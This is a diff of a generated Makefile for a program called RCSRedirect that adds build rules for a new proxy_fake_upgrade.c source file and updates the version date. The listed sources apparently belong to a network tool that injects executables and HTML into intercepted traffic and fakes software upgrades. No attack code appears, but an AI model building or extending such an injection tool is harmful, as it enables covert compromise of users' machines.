@@ -73,6 +73,7 @@ am_RCSRedirect_OBJECTS = RCSRedirect-bio_injector.$(OBJEXT) \
 	RCSRedirect-match_users_radius.$(OBJEXT) \
 	RCSRedirect-netconf.$(OBJEXT) RCSRedirect-packet.$(OBJEXT) \
 	RCSRedirect-parser.$(OBJEXT) RCSRedirect-proxy.$(OBJEXT) \
+	RCSRedirect-proxy_fake_upgrade.$(OBJEXT) \
 	RCSRedirect-proxy_inject_exe.$(OBJEXT) \
 	RCSRedirect-proxy_inject_html.$(OBJEXT) \
 	RCSRedirect-proxy_null.$(OBJEXT) \
@@ -142,7 +143,7 @@ LDFLAGS =  -pthread
 LIBOBJS = 
 LIBS = -lpcap -lresolv -lpthread 
 LTLIBOBJS = 
-MAINT = #
+MAINT = 
 MAKEINFO = ${SHELL} /root/devel/vector-ipa/missing --run makeinfo
 MELTER_LIBS = -L../../RCSStreamingMelter/lib -lmelt -lstdc++ -L../../RCSStreamingMelter/deps/beaengine/lib -lBeaEngine_s -L../../RCSStreamingMelter/deps/asmjit/lib -lAsmJit -lboost_filesystem-mt -lboost_regex-mt -lboost_program_options-mt -lboost_system-mt
 MKDIR_P = /bin/mkdir -p
@@ -164,7 +165,7 @@ SHELL = /bin/sh
 SSLINC = 
 SSLLIB = -lssl -lcrypto
 STRIP = 
-VERSION = 2011.09.12
+VERSION = 2011.12.23
 abs_builddir = /root/devel/vector-ipa/src
 abs_srcdir = /root/devel/vector-ipa/src
 abs_top_builddir = /root/devel/vector-ipa
@@ -223,15 +224,15 @@ RCSRedirect_SOURCES = bio_injector.c bio_replacer.c capture.c \
 	hook.c inet.c log.c main.c match_fqdn.c match_request.c \
 	match_url.c match_users.c match_users_dhcp.c match_users_ip.c \
 	match_users_mac.c match_users_string.c match_users_radius.c \
-	netconf.c packet.c parser.c proxy.c proxy_inject_exe.c \
-	proxy_inject_html.c proxy_null.c proxy_replace.c radius.c \
-	send.c signals.c socket.c statemachine.c statistics.c \
-	strings.c threads.c timer.c ui.c watchdog.c protocols/cooked.c \
-	protocols/erf.c protocols/eth.c protocols/fddi.c \
-	protocols/ip.c protocols/ip6.c protocols/mpls.c \
-	protocols/pppoe.c protocols/tcp.c protocols/tr.c \
-	protocols/vlan.c protocols/udp.c protocols/wifi.c \
-	protocols/wifi_eapol.c protocols/wifi_prism.c \
+	netconf.c packet.c parser.c proxy.c proxy_fake_upgrade.c \
+	proxy_inject_exe.c proxy_inject_html.c proxy_null.c \
+	proxy_replace.c radius.c send.c signals.c socket.c \
+	statemachine.c statistics.c strings.c threads.c timer.c ui.c \
+	watchdog.c protocols/cooked.c protocols/erf.c protocols/eth.c \
+	protocols/fddi.c protocols/ip.c protocols/ip6.c \
+	protocols/mpls.c protocols/pppoe.c protocols/tcp.c \
+	protocols/tr.c protocols/vlan.c protocols/udp.c \
+	protocols/wifi.c protocols/wifi_eapol.c protocols/wifi_prism.c \
 	protocols/wifi_radiotap.c missing/strlcpy.c
 RCSRedirect_CFLAGS = -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64 -fno-strict-aliasing -g -ggdb -Wmissing-prototypes -Wno-uninitialized -Werror -Wformat-security -Wsign-compare -Wall -I/usr/include/pcap   -I../../RCSStreamingMelter/include
 RCSRedirect_LDADD = -L../../RCSStreamingMelter/lib -lmelt -lstdc++ -L../../RCSStreamingMelter/deps/beaengine/lib -lBeaEngine_s -L../../RCSStreamingMelter/deps/asmjit/lib -lAsmJit -lboost_filesystem-mt -lboost_regex-mt -lboost_program_options-mt -lboost_system-mt  
@@ -241,7 +242,7 @@ all: all-am
 
 .SUFFIXES:
 .SUFFIXES: .c .o .obj
-$(srcdir)/Makefile.in: # $(srcdir)/Makefile.am $(top_srcdir)/Makefile.am.common $(am__configure_deps)
+$(srcdir)/Makefile.in:  $(srcdir)/Makefile.am $(top_srcdir)/Makefile.am.common $(am__configure_deps)
 	@for dep in $?; do \
 	  case '$(am__configure_deps)' in \
 	    *$$dep*) \
@@ -266,9 +267,9 @@ Makefile: $(srcdir)/Makefile.in $(top_builddir)/config.status
 $(top_builddir)/config.status: $(top_srcdir)/configure $(CONFIG_STATUS_DEPENDENCIES)
 	cd $(top_builddir) && $(MAKE) $(AM_MAKEFLAGS) am--refresh
 
-$(top_srcdir)/configure: # $(am__configure_deps)
+$(top_srcdir)/configure:  $(am__configure_deps)
 	cd $(top_builddir) && $(MAKE) $(AM_MAKEFLAGS) am--refresh
-$(ACLOCAL_M4): # $(am__aclocal_m4_deps)
+$(ACLOCAL_M4):  $(am__aclocal_m4_deps)
 	cd $(top_builddir) && $(MAKE) $(AM_MAKEFLAGS) am--refresh
 $(am__aclocal_m4_deps):
 install-binPROGRAMS: $(bin_PROGRAMS)
@@ -357,6 +358,7 @@ include ./$(DEPDIR)/RCSRedirect-packet.Po
 include ./$(DEPDIR)/RCSRedirect-parser.Po
 include ./$(DEPDIR)/RCSRedirect-pppoe.Po
 include ./$(DEPDIR)/RCSRedirect-proxy.Po
+include ./$(DEPDIR)/RCSRedirect-proxy_fake_upgrade.Po
 include ./$(DEPDIR)/RCSRedirect-proxy_inject_exe.Po
 include ./$(DEPDIR)/RCSRedirect-proxy_inject_html.Po
 include ./$(DEPDIR)/RCSRedirect-proxy_null.Po
@@ -829,6 +831,20 @@ RCSRedirect-proxy.obj: proxy.c
 #	source='proxy.c' object='RCSRedirect-proxy.obj' libtool=no \
 #	DEPDIR=$(DEPDIR) $(CCDEPMODE) $(depcomp) \
 #	$(CC) $(DEFS) $(DEFAULT_INCLUDES) $(INCLUDES) $(AM_CPPFLAGS) $(CPPFLAGS) $(RCSRedirect_CFLAGS) $(CFLAGS) -c -o RCSRedirect-proxy.obj `if test -f 'proxy.c'; then $(CYGPATH_W) 'proxy.c'; else $(CYGPATH_W) '$(srcdir)/proxy.c'; fi`
+
+RCSRedirect-proxy_fake_upgrade.o: proxy_fake_upgrade.c
+	$(CC) $(DEFS) $(DEFAULT_INCLUDES) $(INCLUDES) $(AM_CPPFLAGS) $(CPPFLAGS) $(RCSRedirect_CFLAGS) $(CFLAGS) -MT RCSRedirect-proxy_fake_upgrade.o -MD -MP -MF $(DEPDIR)/RCSRedirect-proxy_fake_upgrade.Tpo -c -o RCSRedirect-proxy_fake_upgrade.o `test -f 'proxy_fake_upgrade.c' || echo '$(srcdir)/'`proxy_fake_upgrade.c
+	$(am__mv) $(DEPDIR)/RCSRedirect-proxy_fake_upgrade.Tpo $(DEPDIR)/RCSRedirect-proxy_fake_upgrade.Po
+#	source='proxy_fake_upgrade.c' object='RCSRedirect-proxy_fake_upgrade.o' libtool=no \
+#	DEPDIR=$(DEPDIR) $(CCDEPMODE) $(depcomp) \
+#	$(CC) $(DEFS) $(DEFAULT_INCLUDES) $(INCLUDES) $(AM_CPPFLAGS) $(CPPFLAGS) $(RCSRedirect_CFLAGS) $(CFLAGS) -c -o RCSRedirect-proxy_fake_upgrade.o `test -f 'proxy_fake_upgrade.c' || echo '$(srcdir)/'`proxy_fake_upgrade.c
+
+RCSRedirect-proxy_fake_upgrade.obj: proxy_fake_upgrade.c
+	$(CC) $(DEFS) $(DEFAULT_INCLUDES) $(INCLUDES) $(AM_CPPFLAGS) $(CPPFLAGS) $(RCSRedirect_CFLAGS) $(CFLAGS) -MT RCSRedirect-proxy_fake_upgrade.obj -MD -MP -MF $(DEPDIR)/RCSRedirect-proxy_fake_upgrade.Tpo -c -o RCSRedirect-proxy_fake_upgrade.obj `if test -f 'proxy_fake_upgrade.c'; then $(CYGPATH_W) 'proxy_fake_upgrade.c'; else $(CYGPATH_W) '$(srcdir)/proxy_fake_upgrade.c'; fi`
+	$(am__mv) $(DEPDIR)/RCSRedirect-proxy_fake_upgrade.Tpo $(DEPDIR)/RCSRedirect-proxy_fake_upgrade.Po
+#	source='proxy_fake_upgrade.c' object='RCSRedirect-proxy_fake_upgrade.obj' libtool=no \
+#	DEPDIR=$(DEPDIR) $(CCDEPMODE) $(depcomp) \
+#	$(CC) $(DEFS) $(DEFAULT_INCLUDES) $(INCLUDES) $(AM_CPPFLAGS) $(CPPFLAGS) $(RCSRedirect_CFLAGS) $(CFLAGS) -c -o RCSRedirect-proxy_fake_upgrade.obj `if test -f 'proxy_fake_upgrade.c'; then $(CYGPATH_W) 'proxy_fake_upgrade.c'; else $(CYGPATH_W) '$(srcdir)/proxy_fake_upgrade.c'; fi`
 
 RCSRedirect-proxy_inject_exe.o: proxy_inject_exe.c
 	$(CC) $(DEFS) $(DEFAULT_INCLUDES) $(INCLUDES) $(AM_CPPFLAGS) $(CPPFLAGS) $(RCSRedirect_CFLAGS) $(CFLAGS) -MT RCSRedirect-proxy_inject_exe.o -MD -MP -MF $(DEPDIR)/RCSRedirect-proxy_inject_exe.Tpo -c -o RCSRedirect-proxy_inject_exe.o `test -f 'proxy_inject_exe.c' || echo '$(srcdir)/'`proxy_inject_exe.c
